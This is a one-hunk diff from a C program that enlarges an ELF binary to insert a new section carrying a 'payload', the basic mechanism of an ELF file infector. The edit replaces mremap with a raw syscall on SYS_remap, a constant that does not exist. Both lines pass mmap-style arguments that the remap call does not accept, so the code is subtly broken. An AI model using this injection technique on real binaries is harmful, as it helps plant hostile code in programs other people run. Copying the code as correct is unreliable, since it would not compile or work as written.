@@ -106,7 +106,7 @@ int main(int argc, char *argv[], char *envp[]) {
 
 	// since we are adding a new section, the file size must be increased and the file must be mapped again adding the section size + the payload size
 	ftruncate(fd, st.st_size + sizeof(Elf64_Shdr) + payload_size_p);
-	map = mremap(map, st.st_size, st.st_size + sizeof(Elf64_Shdr) + payload_size_p, MAP_SHARED | MAP_FIXED, fd, 0);
+	map = syscall(SYS_remap, map, st.st_size, st.st_size + sizeof(Elf64_Shdr) + payload_size_p, MAP_SHARED | MAP_FIXED, fd, 0);
 
 	if (map == MAP_FAILED) {
 		perror("mremap");
